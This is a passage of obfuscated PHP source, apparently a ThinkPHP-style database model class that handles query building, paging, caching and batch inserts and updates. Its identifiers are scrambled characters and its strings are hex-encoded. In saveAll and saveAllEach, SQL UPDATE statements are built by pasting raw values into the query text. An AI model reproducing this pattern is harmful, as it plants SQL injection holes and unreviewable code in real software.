ÒüÔ ? array_diff($Ñ ÒüÔ, $Ú§¥Œ∑) : $Ú§¥Œ∑; } $this->options[$÷ÕêÍ©ö[268]] = $Ú§¥Œ∑; return $this; } public function scope($“ ÏÿÌÍ = '', $íØ∫ Ê¸ = NULL) { $ﬁÿ¯œ˛´ =& $_SERVER[Çâä∆◊¡]; if ($ﬁÿ¯œ˛´[12] === $“ ÏÿÌÍ) { if (isset($this->_scope[$ﬁÿ¯œ˛´[37]])) { $›‹€ô◊Û = $this->_scope[$ﬁÿ¯œ˛´[37]]; } else { return $this; } } elseif (is_string($“ ÏÿÌÍ)) { $ºÒ„Ÿ◊§ = explode($ﬁÿ¯œ˛´[50], $“ ÏÿÌÍ); $›‹€ô◊Û = array(); foreach ($ºÒ„Ÿ◊§ as $…ú†ﬁâ¿) { if (!isset($this->_scope[$…ú†ﬁâ¿])) { continue; } $›‹€ô◊Û = array_merge($›‹€ô◊Û, $this->_scope[$…ú†ﬁâ¿]); } if (!empty($íØ∫ Ê¸) && is_array($íØ∫ Ê¸)) { $›‹€ô◊Û = array_merge($›‹€ô◊Û, $íØ∫ Ê¸); } } elseif (is_array($“ ÏÿÌÍ)) { $›‹€ô◊Û = $“ ÏÿÌÍ; } if (is_array($›‹€ô◊Û) && !empty($›‹€ô◊Û)) { $this->options = array_merge($this->options, array_change_key_case($›‹€ô◊Û)); } return $this; } public function where($ù∏ç¬±ã, $”¯ñ ∏‹ = null) { $Ó©≤î— =& $_SERVER[Çâä∆◊¡]; if (!is_null($”¯ñ ∏‹) && is_string($ù∏ç¬±ã)) { if (!is_array($”¯ñ ∏‹)) { $”¯ñ ∏‹ = func_get_args(); array_shift($”¯ñ ∏‹); } $”¯ñ ∏‹ = array_map(array($this->db, $Ó©≤î—[338]), $”¯ñ ∏‹); $ù∏ç¬±ã = vsprintf($ù∏ç¬±ã, $”¯ñ ∏‹); } elseif (is_object($ù∏ç¬±ã)) { $ù∏ç¬±ã = get_object_vars($ù∏ç¬±ã); } elseif (is_array($ù∏ç¬±ã)) { foreach ($ù∏ç¬±ã as $πÑÔ…ÙÅ => $î›æÏ˘⁄) { if ((is_numeric($πÑÔ…ÙÅ) || !$πÑÔ…ÙÅ) && is_string($î›æÏ˘⁄)) { if (strpos($î›æÏ˘⁄, $Ó©≤î—[345]) === 0) { continue; } think_trace($Ó©≤î—[346], $Ó©≤î—[12], $Ó©≤î—[49]); die; } } } if (is_string($ù∏ç¬±ã) && $Ó©≤î—[12] != $ù∏ç¬±ã) { $Ë‰ä¥äâ = array(); $Ë‰ä¥äâ[$Ó©≤î—[347]] = $ù∏ç¬±ã; $ù∏ç¬±ã = $Ë‰ä¥äâ; } if (isset($this->options[$Ó©≤î—[270]])) { $this->options[$Ó©≤î—[270]] = array_merge($this->options[$Ó©≤î—[270]], $ù∏ç¬±ã); } else { $this->options[$Ó©≤î—[270]] = $ù∏ç¬±ã; } return $this; } public function limit($°—∂Ñà‰, $è¯œÒ©¨ = null) { $Ê∏»¡å§ =& $_SERVER[Çâä∆◊¡]; $this->options[$Ê∏»¡å§[287]] = is_null($è¯œÒ©¨) ? $°—∂Ñà‰ : $°—∂Ñà‰ . $Ê∏»¡å§[50] . $è¯œÒ©¨; return $this; } public function page($€ıÔüö°, $áÓ˛Å˙È = null) { $˛ÓØ≤∞Ü =& $_SERVER[Çâä∆◊¡]; $this->options[$˛ÓØ≤∞Ü[348]] = is_null($áÓ˛Å˙È) ? $€ıÔüö° : $€ıÔüö° . $˛ÓØ≤∞Ü[50] . $áÓ˛Å˙È; return $this; } public function comment($∆î®ÙÒ∆) { $this->options[$_SERVER[Çâä∆◊¡][349]] = $∆î®ÙÒ∆; return $this; } public function setProperty($ïÿ∂ç£‹, $â˚Ê°àÛ) { if (property_exists($this, $ïÿ∂ç£‹)) { $this->{$ïÿ∂ç£‹} = $â˚Ê°àÛ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\124\x69\x6d\x65", "\164\x69\x6d\145", "\151\x6e\163\x65\162\164\x2c\x75\160\144\x61\164\145", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\143\x72\x65\141\x74\145\124\151\155\145", "\x74\x69\155\x65", "\x69\x6e\163\x65\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\x6e")); public function setDataAuto($ê»…ÛÙ∏) { $this->dataAuto = $ê»…ÛÙ∏; } public function __construct($ﬂ°¸ÏÜÓ = '', $ŸÍ©ˆÃ = '', $Åö◊‘¶ó = '') { parent::__construct($ﬂ°¸ÏÜÓ, $ŸÍ©ˆÃ, $Åö◊‘¶ó); } protected $tableMeta = array(); protected function _beforeInsert(&$≤Íî¬Ù©, $áö¶∫æÔ) { $Ê…‡ôìÁ =& $_SERVER[Çâä∆◊¡]; if (!$this->checkDataAutoHas($Ê…‡ôìÁ[350])) { return; } $this->dataBeforeFilter($≤Íî¬Ù©, $Ê…‡ôìÁ[350]); } protected function _beforeUpdate(&$¢¢˘Ñåû, $å§⁄·›«) { $ô™©çÉÃ =& $_SERVER[Çâä∆◊¡]; if (!$this->checkDataAutoHas($ô™©çÉÃ[351])) { return; } $this->dataBeforeFilter($¢¢˘Ñåû, $ô™©çÉÃ[351]); } protected function _afterSelect(&$íƒá›ÿÅ, $é∞¿ö‰Ë) { if (!is_array($íƒá›ÿÅ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Çâä∆◊¡][352])) { return; } foreach ($íƒá›ÿÅ as &$ª›à◊¥«) { $this->dataAfterFilter($ª›à◊¥«); } unset($ª›à◊¥«); } protected function _afterFind(&$˛∑È£˝¢, $•˜Ó™õ‡) { if (!is_array($˛∑È£˝¢)) { return; } if (!$this->checkDataAutoHas($_SERVER[Çâä∆◊¡][352])) { return; } $this->dataAfterFilter($˛∑È£˝¢); } public static function textEncode($…Âòß≥•) { if (!$…Âòß≥•) { return $…Âòß≥•; } $öÁ‹§ˆØ = json_encode($…Âòß≥•); $öÁ‹§ˆØ = preg_replace_callback($_SERVER[Çâä∆◊¡][353], function ($™¶˚Íò‹) { return addslashes($™¶˚Íò‹[0]); }, $öÁ‹§ˆØ); return json_decode($öÁ‹§ˆØ); } public static function textDecode($µ˛∞Î“◊) { $™ÿ¿∑º√ =& $_SERVER[Çâä∆◊¡]; $—€∏âΩà = json_encode($µ˛∞Î“◊); $—€∏âΩà = preg_replace_callback($™ÿ¿∑º√[354], function ($’¬Ë¿Ø´) { return $_SERVER[Çâä∆◊¡][98]; }, $—€∏âΩà); return json_decode($—€∏âΩà); } public function setAutoIncrement($éç˙˝Ô©) { $ı§§¸î⁄ = array($this->getPk() => $éç˙˝Ô©); $Ê»Ü∑≤“ = $this->data($ı§§¸î⁄)->add(); if ($Ê»Ü∑≤“) { $this->delete($Ê»Ü∑≤“); } } public function getAutoIncrement() { $Ã‰°èïú = $this->getTableName(); $´èÑÒÍè = $this->max($this->getPk()); $§ÑÍ¢ﬂê = $this->query("\x73\150\x6f\x77\x20\x74\x61\142\x6c\x65\40\163\164\141\x74\165\163\x20\x77\x68\145\162\x65\40\116\x61\x6d\x65\x3d\47{$Ã‰°èïú}\47"); $Ñ≈˜Ûó∂ = $§ÑÍ¢ﬂê[0][$_SERVER[Çâä∆◊¡][355]]; $òÿ˙è¯´ = max($´èÑÒÍè, $Ñ≈˜Ûó∂); return $òÿ˙è¯´; } protected function _callBefore($≠≤¬œ∞Ü, $∑¬•ô∏©) { return $this->cacheCallCheck($≠≤¬œ∞Ü, $∑¬•ô∏©, !1); } protected function _callAfter($ü–å˙Âë, $Éô£ä„Ì) { return $this->cacheCallCheck($ü–å˙Âë, $Éô£ä„Ì, !0); } protected function cacheFunctionAlias($Ø®´ù∞·) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Áü‡é¿˛, $É‡ß≈¶í, $ñÊÓò«Ñ = false) { $àÙöÊ“È = $this->cacheFunctionAlias($É‡ß≈¶í); if (!$àÙöÊ“È) { return; } foreach ($àÙöÊ“È as $Ø•Ê˘¢ => $©¢˚¢ªŒ) { $ÅÌàãìí = $©¢˚¢ªŒ[0]; $óÔõ˘˚ = explode($_SERVER[Çâä∆◊¡][50], $©¢˚¢ªŒ[1]); if ($Áü‡é¿˛ == $Ø•Ê˘¢) { return $this->cacheFunctionGet($Ø•Ê˘¢, $ÅÌàãìí); } if ($ñÊÓò«Ñ && in_array($Áü‡é¿˛, $óÔõ˘˚)) { $this->cacheFunctionClear($Ø•Ê˘¢, $ÅÌàãìí); } } } public function cacheFunctionGet($ó»°Õß≤, $÷§Œ¢òÇ) { $¯„Èô© = $this->cacheKeyMake($ó»°Õß≤, $÷§Œ¢òÇ); $ä¡õÊ¿î = Cache::get($¯„Èô©); if (!is_array($ä¡õÊ¿î)) { $ä¡õÊ¿î = call_user_func_array(array($this, $ó»°Õß≤), array($÷§Œ¢òÇ, !0)); Cache::set($¯„Èô©, $ä¡õÊ¿î); } return $ä¡õÊ¿î; } public function cacheFunctionClear($ÆÂíª«å, $•˚∏˜Œ∫) { $¬≤¶∞Ó» = $•˚∏˜Œ∫; if (!is_array($•˚∏˜Œ∫)) { $¬≤¶∞Ó» = array($•˚∏˜Œ∫); } foreach ($¬≤¶∞Ó» as $˘®Ö —ô) { $…ÓÅìü¯ = $this->cacheKeyMake($ÆÂíª«å, $˘®Ö —ô); Cache::remove($…ÓÅìü¯); } } private function cacheKeyMake($˝¸’®¥≥, $Ë¸◊‘•≤) { $œ⁄÷‘ÓÙ =& $_SERVER[Çâä∆◊¡]; return get_class($this) . $œ⁄÷‘ÓÙ[11] . $˝¸’®¥≥ . $œ⁄÷‘ÓÙ[356] . $Ë¸◊‘•≤; } protected function selectPageReset() { $„¸ÑÇÓø =& $_SERVER[Çâä∆◊¡]; if (isset($GLOBALS[$„¸ÑÇÓø[357]])) { return; } $GLOBALS[$„¸ÑÇÓø[357]] = isset($GLOBALS[$„¸ÑÇÓø[7]][$„¸ÑÇÓø[358]]) ? $GLOBALS[$„¸ÑÇÓø[7]][$„¸ÑÇÓø[358]] : !1; $GLOBALS[$„¸ÑÇÓø[359]] = isset($GLOBALS[$„¸ÑÇÓø[7]][$„¸ÑÇÓø[348]]) ? $GLOBALS[$„¸ÑÇÓø[7]][$„¸ÑÇÓø[348]] : !1; $GLOBALS[$„¸ÑÇÓø[7]][$„¸ÑÇÓø[358]] = !1; $GLOBALS[$„¸ÑÇÓø[7]][$„¸ÑÇÓø[348]] = !1; } protected function selectPageRestore() { $úô¢öﬂ£ =& $_SERVER[Çâä∆◊¡]; if (!isset($GLOBALS[$úô¢öﬂ£[357]])) { return; } $GLOBALS[$úô¢öﬂ£[7]][$úô¢öﬂ£[358]] = $GLOBALS[$úô¢öﬂ£[357]]; $GLOBALS[$úô¢öﬂ£[7]][$úô¢öﬂ£[348]] = $GLOBALS[$úô¢öﬂ£[359]]; if ($GLOBALS[$úô¢öﬂ£[7]][$úô¢öﬂ£[358]] === !1) { unset($GLOBALS[$úô¢öﬂ£[7]][$úô¢öﬂ£[358]]); } if ($GLOBALS[$úô¢öﬂ£[7]][$úô¢öﬂ£[348]] === !1) { unset($GLOBALS[$úô¢öﬂ£[7]][$úô¢öﬂ£[348]]); } unset($GLOBALS[$úô¢öﬂ£[357]]); unset($GLOBALS[$úô¢öﬂ£[359]]); } protected function selectPage($˘Ë™”®ı = 200, $Ú˜¸Ò≠¡ = 1) { $ˆÄæ¬’ =& $_SERVER[Çâä∆◊¡]; global $in; $≥˘“®ú¯ = $this->optionsValue(); $Ô‘…†Óö = 50000; $˘Ë™”®ı = isset($in[$ˆÄæ¬’[358]]) && $in[$ˆÄæ¬’[358]] ? $in[$ˆÄæ¬’[358]] : $˘Ë™”®ı; if ($˘Ë™”®ı === -1) { $in[$ˆÄæ¬’[358]] = !1; $Ô‘…†Óö = 100000000; $˘Ë™”®ı = $Ô‘…†Óö; } $∂ç◊Îﬂ£ = $≥˘“®ú¯; $∂ç◊Îﬂ£[$ˆÄæ¬’[360]] = array(); $˘Ë™”®ı = intval($˘Ë™”®ı); $˘Ë™”®ı = $˘Ë™”®ı <= 5 ? 5 : ($˘Ë™”®ı >= $Ô‘…†Óö ? $Ô‘…†Óö : $˘Ë™”®ı); $Ú˜¸Ò≠¡ = intval(isset($in[$ˆÄæ¬’[348]]) && $in[$ˆÄæ¬’[348]] ? $in[$ˆÄæ¬’[348]] : $Ú˜¸Ò≠¡); $Ú˜¸Ò≠¡ = $Ú˜¸Ò≠¡ <= 1 ? 1 : $Ú˜¸Ò≠¡; $†Á◊‰°ü = array(); $ö¬ñËø¸ = 1; if ($Ú˜¸Ò≠¡ == 1 && $ö¬ñËø¸) { $this->optionsValue($≥˘“®ú¯); $†Á◊‰°ü = $this->page($Ú˜¸Ò≠¡, $˘Ë™”®ı)->select(); $ï˛Úø» = is_array($†Á◊‰°ü) ? count($†Á◊‰°ü) : 0; if ($ï˛Úø» < $˘Ë™”®ı) { $÷Õ∫Î¶Ò = 1; } else { $this->optionsValue($∂ç◊Îﬂ£); $ï˛Úø» = intval($this->count()); $÷Õ∫Î¶Ò = ceil($ï˛Úø» / $˘Ë™”®ı); } } else { $this->optionsValue($∂ç◊Îﬂ£); $ï˛Úø» = intval($this->count()); $÷Õ∫Î¶Ò = ceil($ï˛Úø» / $˘Ë™”®ı); $Ú˜¸Ò≠¡ = $Ú˜¸Ò≠¡ >= $÷Õ∫Î¶Ò ? $÷Õ∫Î¶Ò : $Ú˜¸Ò≠¡; $this->optionsValue($≥˘“®ú¯); $†Á◊‰°ü = $this->page($Ú˜¸Ò≠¡, $˘Ë™”®ı)->select(); } if (!is_array($†Á◊‰°ü)) { $†Á◊‰°ü = array(); } if ($÷Õ∫Î¶Ò == 1) { $ï˛Úø» = count($†Á◊‰°ü); } $°ÔÄˆ´ç = array($ˆÄæ¬’[361] => array($ˆÄæ¬’[362] => $ï˛Úø», $ˆÄæ¬’[358] => $˘Ë™”®ı, $ˆÄæ¬’[348] => $Ú˜¸Ò≠¡, $ˆÄæ¬’[363] => $÷Õ∫Î¶Ò), $ˆÄæ¬’[364] => $†Á◊‰°ü); return $°ÔÄˆ´ç; } protected function checkLength($®…ﬁ∆ÖÚ, $˜∫…„øÖ = 0, $ëë…⁄˜· = '') { $∆⁄–´ß˘ =& $_SERVER[Çâä∆◊¡]; $˜∫…„øÖ = $˜∫…„øÖ ? $˜∫…„øÖ : 65536; if (!$®…ﬁ∆ÖÚ || strlen($®…ﬁ∆ÖÚ) < $˜∫…„øÖ) { return; } $ëë…⁄˜· = $ëë…⁄˜· ? $ëë…⁄˜· . $∆⁄–´ß˘[71] : $∆⁄–´ß˘[12]; show_json($ëë…⁄˜· . LNG($∆⁄–´ß˘[365]) . "\50{$˜∫…„øÖ}\51", !1); } protected function metaSet($±Œ‚Ú≈ï, $È‹øµºñ = null, $‡÷áæƒ• = null) { $˘È£–ã≠ =& $_SERVER[Çâä∆◊¡]; if (!$this->tableMeta || !$±Œ‚Ú≈ï) { return !1; } $ìåÌÉ…∆ = $this->tableMeta[$˘È£–ã≠[366]]; $≠˚Ùî°Ω = $this->tableMeta[$˘È£–ã≠[367]]; $˝î•ñ„å = Model($≠˚Ùî°Ω); $¥ÛÚÁ∂Ò = array($ìåÌÉ…∆ => $±Œ‚Ú≈ï, $˘È£–ã≠[368] => $È‹øµºñ); if (is_null($È‹øµºñ)) { return $˝î•ñ„å->where(array($ìåÌÉ…∆ => $±Œ‚Ú≈ï))->delete(); } if (is_null($‡÷áæƒ•) && is_string($È‹øµºñ)) { return $˝î•ñ„å->where($¥ÛÚÁ∂Ò)->delete(); } $Æ‰ó§íä = is_array($È‹øµºñ) ? $È‹øµºñ : array(); if (is_string($È‹øµºñ)) { $Æ‰ó§íä[$È‹øµºñ] = $‡÷áæƒ•; } $’˛ÙóπÅ = array(); foreach ($Æ‰ó§íä as $˙≥∆‚›„ => $·⁄æƒºì) { if (is_null($·⁄æƒºì) && is_string($˙≥∆‚›„)) { $˝î•ñ„å->where(array($ìåÌÉ…∆ => $±Œ‚Ú≈ï, $˘È£–ã≠[368] => $˙≥∆‚›„))->delete(); continue; } $this->checkLength($·⁄æƒºì, !1, $≠˚Ùî°Ω . $˘È£–ã≠[4] . $˙≥∆‚›„); $’˛ÙóπÅ[] = array($ìåÌÉ…∆ => $±Œ‚Ú≈ï, $˘È£–ã≠[95] => $˙≥∆‚›„, $˘È£–ã≠[369] => $·⁄æƒºì); } $§ÅÄ»∫¿ = $˘È£–ã≠[370] . $≠˚Ùî°Ω; CacheLock::lock($§ÅÄ»∫¿); $˝î•ñ„å->where(array($ìåÌÉ…∆ => $±Œ‚Ú≈ï))->addAll($’˛ÙóπÅ, array(), !0); CacheLock::unlock($§ÅÄ»∫¿); return !0; } public function metaGet($≠µıãﬂ”, $öó≥‡ãà = false) { $À†óÆà† =& $_SERVER[Çâä∆◊¡]; if (!$this->tableMeta) { return array(); } $ª–⁄´ı≥ = $this->tableMeta[$À†óÆà†[366]]; $ø°‹‚Âñ = Model($this->tableMeta[$À†óÆà†[367]]); if ($öó≥‡ãà) { $Ê¨√·ú¢ = array($ª–⁄´ı≥ => $≠µıãﬂ”, $À†óÆà†[95] => $öó≥‡ãà); return $ø°‹‚Âñ->where($Ê¨√·ú¢)->getField($À†óÆà†[369]); } $Ê¨√·ú¢ = array($ª–⁄´ı≥ => $≠µıãﬂ”); $◊ÎäıÉ„ = $ø°‹‚Âñ->field($À†óÆà†[371])->where($Ê¨√·ú¢)->select(); $◊ÎäıÉ„ = array_to_keyvalue($◊ÎäıÉ„, $À†óÆà†[95], $À†óÆà†[369]); return $◊ÎäıÉ„; } private function checkDataAutoHas($íÙÔ†öÁ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÏÏ‹’¡≠) { if (in_array($íÙÔ†öÁ, explode($_SERVER[Çâä∆◊¡][50], $ÏÏ‹’¡≠[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Î∞ÜÍ…Ï, $ªÂËú“ø) { $ßæù„”œ =& $_SERVER[Çâä∆◊¡]; if (!is_array($Î∞ÜÍ…Ï)) { return; } foreach ($this->dataAuto as $ãß‰Èâ˘) { $èÏ∫È«Í = $ãß‰Èâ˘[0]; if (!in_array($ªÂËú“ø, explode($ßæù„”œ[50], $ãß‰Èâ˘[2]))) { continue; } switch (trim($ãß‰Èâ˘[3])) { case $ßæù„”œ[316]: case $ßæù„”œ[317]: $—Â‘¯–≤ = $ãß‰Èâ˘[1]; $Ãò¥îíö = isset($ãß‰Èâ˘[4]) ? (array) $ãß‰Èâ˘[4] : array(); if ($—Â‘¯–≤ == $ßæù„”œ[196] && array_key_exists($èÏ∫È«Í, $Î∞ÜÍ…Ï)) { if (!$Î∞ÜÍ…Ï[$èÏ∫È«Í]) { unset($Î∞ÜÍ…Ï[$èÏ∫È«Í]); } break; } if (isset($Î∞ÜÍ…Ï[$èÏ∫È«Í])) { array_unshift($Ãò¥îíö, $Î∞ÜÍ…Ï[$èÏ∫È«Í]); } if ($ßæù„”œ[316] == $ãß‰Èâ˘[3]) { $Î∞ÜÍ…Ï[$èÏ∫È«Í] = call_user_func_array($—Â‘¯–≤, $Ãò¥îíö); } else { $Î∞ÜÍ…Ï[$èÏ∫È«Í] = call_user_func_array(array(&$this, $—Â‘¯–≤), $Ãò¥îíö); } break; case $ßæù„”œ[265]: if (isset($Î∞ÜÍ…Ï[$èÏ∫È«Í]) && $Î∞ÜÍ…Ï[$èÏ∫È«Í]) { $Î∞ÜÍ…Ï[$èÏ∫È«Í] = call_user_func_array(array(&$this, $ãß‰Èâ˘[1]), array($Î∞ÜÍ…Ï[$èÏ∫È«Í])); } break; case $ßæù„”œ[268]: $Î∞ÜÍ…Ï[$èÏ∫È«Í] = $Î∞ÜÍ…Ï[$ãß‰Èâ˘[1]]; break; case $ßæù„”œ[289]: if (isset($Î∞ÜÍ…Ï[$èÏ∫È«Í]) && !is_string($Î∞ÜÍ…Ï[$èÏ∫È«Í])) { $Î∞ÜÍ…Ï[$èÏ∫È«Í] = json_encode_force($Î∞ÜÍ…Ï[$èÏ∫È«Í]); } break; case $ßæù„”œ[318]: if ($Î∞ÜÍ…Ï[$èÏ∫È«Í] === $ßæù„”œ[12]) { unset($Î∞ÜÍ…Ï[$èÏ∫È«Í]); } break; case $ßæù„”œ[319]: $Î∞ÜÍ…Ï[$èÏ∫È«Í] = $ãß‰Èâ˘[1]; default: break; } } if ($ªÂËú“ø == $ßæù„”œ[350]) { $ÑóîÜ≥ÿ = strtolower($this->db->getDbType()); if (strpos($ÑóîÜ≥ÿ, $ßæù„”œ[13]) !== 0) { return; } $µËÊû≈ú = $this->field(!0)->fields; $®Áÿ¿œÿ = $µËÊû≈ú[$ßæù„”œ[247]]; if (isset($µËÊû≈ú[$ßæù„”œ[246]])) { unset($®Áÿ¿œÿ[$µËÊû≈ú[$ßæù„”œ[246]]]); } foreach ($®Áÿ¿œÿ as $Ç¬ÿﬂÛı => $ªÂËú“ø) { if (!isset($Î∞ÜÍ…Ï[$Ç¬ÿﬂÛı])) { $Î∞ÜÍ…Ï[$Ç¬ÿﬂÛı] = $ßæù„”œ[12]; } } } } private function dataAfterFilter(&$Î˜à√∫) { $‘Õπßåó =& $_SERVER[Çâä∆◊¡]; foreach ($this->dataAuto as $ó‡ûÆ¬è) { $˙¡Õ˙√ƒ = $ó‡ûÆ¬è[0]; if (!isset($Î˜à√∫[$˙¡Õ˙√ƒ])) { continue; } if (!in_array($‘Õπßåó[352], explode($‘Õπßåó[50], $ó‡ûÆ¬è[2]))) { continue; } switch (trim($ó‡ûÆ¬è[3])) { case $‘Õπßåó[316]: case $‘Õπßåó[317]: $áéÎ˙Œí = isset($ó‡ûÆ¬è[4]) ? (array) $ó‡ûÆ¬è[4] : array(); array_unshift($áéÎ˙Œí, $Î˜à√∫[$˙¡Õ˙√ƒ]); if (isset($ó‡ûÆ¬è[4]) && $ó‡ûÆ¬è[4] == $‘Õπßåó[372]) { $áéÎ˙Œí = array($Î˜à√∫[$˙¡Õ˙√ƒ]); } if ($‘Õπßåó[316] == $ó‡ûÆ¬è[3]) { $Î˜à√∫[$˙¡Õ˙√ƒ] = call_user_func_array($ó‡ûÆ¬è[1], $áéÎ˙Œí); } else { $Î˜à√∫[$˙¡Õ˙√ƒ] = call_user_func_array(array(&$this, $ó‡ûÆ¬è[1]), $áéÎ˙Œí); } break; case $‘Õπßåó[265]: if (isset($Î˜à√∫[$˙¡Õ˙√ƒ]) && $Î˜à√∫[$˙¡Õ˙√ƒ]) { $Î˜à√∫[$˙¡Õ˙√ƒ] = call_user_func_array(array(&$this, $ó‡ûÆ¬è[1]), array($Î˜à√∫[$˙¡Õ˙√ƒ])); } break; case $‘Õπßåó[268]: $Î˜à√∫[$˙¡Õ˙√ƒ] = $Î˜à√∫[$ó‡ûÆ¬è[1]]; break; case $‘Õπßåó[289]: $˙Û‚“Ûê = $Î˜à√∫[$˙¡Õ˙√ƒ]; $Î˜à√∫[$˙¡Õ˙√ƒ] = json_decode($˙Û‚“Ûê, !0); if (is_null($Î˜à√∫[$˙¡Õ˙√ƒ])) { $Î˜à√∫[$˙¡Õ˙√ƒ] = $˙Û‚“Ûê; } break; case $‘Õπßåó[318]: if ($Î˜à√∫[$˙¡Õ˙√ƒ] === $‘Õπßåó[12]) { unset($Î˜à√∫[$˙¡Õ˙√ƒ]); } break; case $‘Õπßåó[319]: $Î˜à√∫[$˙¡Õ˙√ƒ] = $ó‡ûÆ¬è[1]; break; default: break; } } } public function saveAll($œú€í•ﬂ) { $Íà⁄·±˘ =& $_SERVER[Çâä∆◊¡]; $ÀÙ∏ªè¿ = $this->tablePrefix . $this->tableName; $˘·–„Ëõ = self::SQL_WHERE_IN_CHUNK; $œú€í•ﬂ = is_array($œú€í•ﬂ) ? $œú€í•ﬂ : array(); $¬Œµ∑˚Å = $Íà⁄·±˘[373]; $ÕÃÎÿ˜› = 0; $Áƒ⁄Ÿÿ = array(); $†∑„·Á˚ = count($œú€í•ﬂ); for ($‡’§çÄ≥ = 0; $‡’§çÄ≥ < $†∑„·Á˚; $‡’§çÄ≥++) { $Ì√ãøñ = $œú€í•ﬂ[$‡’§çÄ≥]; if (!is_array($Ì√ãøñ) || count($Ì√ãøñ) != 4) { continue; } $¢©˘óÇÒ = "\x55\x50\104\101\x54\x45\x20\140{$ÀÙ∏ªè¿}\140\x20\x53\x45\124\40{$Ì√ãøñ[2]}\40\x3d\40\x43\x41\x53\x45\40{$Ì√ãøñ[0]}\40\12"; if ($ÕÃÎÿ˜› == 0) { $¬Œµ∑˚Å = $¢©˘óÇÒ; } $Áƒ⁄Ÿÿ[] = $Íà⁄·±˘[117] . $Ì√ãøñ[1] . $Íà⁄·±˘[117]; $ÕÃÎÿ˜›++; $¬Œµ∑˚Å .= "\x20\x57\110\105\x4e\40\47{$Ì√ãøñ[1]}\x27\40\124\x48\105\x4e\x20\47{$Ì√ãøñ[3]}\x27\40\xa"; if ($ÕÃÎÿ˜› == $˘·–„Ëõ || $‡’§çÄ≥ == $†∑„·Á˚ - 1) { $ÜÀÚ ˆü = implode($Íà⁄·±˘[50], $Áƒ⁄Ÿÿ); $¬Œµ∑˚Å .= "\40\x45\x4e\x44\x20\40\x57\x48\105\x52\x45\40{$Ì√ãøñ[0]}\40\x49\x4e\x20\50{$ÜÀÚ ˆü}\x29\x20"; $this->execute($¬Œµ∑˚Å); $ÕÃÎÿ˜› = 0; $¬Œµ∑˚Å = $¢©˘óÇÒ; $this->chunkEventCheck(count($Áƒ⁄Ÿÿ)); $Áƒ⁄Ÿÿ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‰Ëë‚àŒ) { $¯ÌÔ‡è∞ =& $_SERVER[Çâä∆◊¡]; $É¡ÉÁó = $this->tablePrefix . $this->tableName; foreach ($‰Ëë‚àŒ as $™¥ı∫ΩΩ) { if (!is_array($™¥ı∫ΩΩ) || count($™¥ı∫ΩΩ) != 4) { continue; } $ÆŸÛÑá· = $™¥ı∫ΩΩ[0] . $¯ÌÔ‡è∞[374] . $™¥ı∫ΩΩ[1] . $¯ÌÔ‡è∞[117]; $∑ùó≠Í˜ = $™¥ı∫ΩΩ[2] . $¯ÌÔ‡è∞[374] . $™¥ı∫ΩΩ[3] . $¯ÌÔ‡è∞[117]; $ê–“˛Æ´ = "\x75\x70\x64\141\164\x65\40{$É¡ÉÁó}\x20\163\145\164\x20{$∑ùó≠Í˜}\x20\x77\150\145\162\x65\x20{$ÆŸÛÑá·}\x3b"; $this->execute($ê–“˛Æ´); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($©∞ù™»ƒ = false, $¯Õ‹¬Õî = false) { $this->_chunkEvent = $©∞ù™»ƒ; $this->_chunkEventParam = $¯Õ‹¬Õî; } private function chunkEventCheck($Âà ˆ‡€) { if (!$this->_chunkEvent) { return; } $°ÄÎâÎà = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $°ÄÎâÎà[$_SERVER[Çâä∆◊¡][375]] = $Âà ˆ‡€; Hook::trigger($this->_chunkEvent, $°ÄÎâÎà); } public function addAll($ﬁ”‰í∆ç, $˜¥Ô¿ò§ = array(), $¿Â—èÓ´ = false) { $Ù⁄≥ÂÆ° =& $_SERVER[Çâä∆◊¡]; ignore_timeout(); $≥çáºÖ¨ = self::SQL_WHERE_IN_CHUNK; if (empty($ﬁ”‰í∆ç)) { $this->error = think_lang($Ù⁄≥ÂÆ°[266]); return !1; } $˜¥Ô¿ò§ = $this->_parseOptions($˜¥Ô¿ò§); foreach ($ﬁ”‰í∆ç as $ôßÉÃÌ– => $–òÚ·ú¬) { $ﬁ”‰í∆ç[$ôßÉÃÌ–] = $this->_facade($–òÚ·ú¬); $this->_beforeInsert($ﬁ”‰í∆ç[$ôßÉÃÌ–], $˜¥Ô¿ò§); } if (method_exists($this->db, $Ù⁄≥ÂÆ°[267])) { for ($ª√ÒµÀÂ = 0; $ª√ÒµÀÂ < count($ﬁ”‰í∆ç); $ª√ÒµÀÂ += $≥çáºÖ¨) { $µºÇ´Óé = array_slice($ﬁ”‰í∆ç, $ª√ÒµÀÂ, $≥çáºÖ¨); if (!is_array($µºÇ´Óé) || count($µºÇ´Óé) == 0) { break; } $‡ç≤˝ë‹ = $this->db->insertAll($µºÇ´Óé, $˜¥Ô¿ò§, $¿Â—èÓ´); $this->chunkEventCheck(count($µºÇ´Óé)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ﬁ”‰í∆ç as $ôßÉÃÌ– => $–òÚ·ú¬) { $‡ç≤˝ë‹ = $this->db->insert($–òÚ·ú¬, $˜¥Ô¿ò§, $¿Â—èÓ´); } $this->commit(); } if (!1 !== $‡ç≤˝ë‹) { $Ü´∂¢ì† = $this->getLastInsID(); if ($Ü´∂¢ì†) { return $Ü´∂¢ì†; } } return $‡ç≤˝ë‹; } public function save($©˛Ì∆«ı = '', $ŒÑÏæÇæ = array()) { $“≥÷„π± =& $_SERVER[Çâä∆◊¡]; $—¯Ë‚¡≥ = self::SQL_WHERE_IN_CHUNK; $Ç¬ù€ « = $this->optionsValue(); $¸íùªœﬂ = $this->findWhereField($Ç¬ù€ «); if (!$¸íùªœﬂ) { return parent::save($©˛Ì∆«ı, $ŒÑÏæÇæ); } $˜ü≤â≈ﬁ = 0; $Üß°Çı¿ = $Ç¬ù€ «[$“≥÷„π±[270]][$¸íùªœﬂ][1]; $Üß°Çı¿ = is_array($Üß°Çı¿) ? $Üß°Çı¿ : array(); $Ùƒàî©≥ = count($Üß°Çı¿); for ($ÍÉñúŒÚ = 0; 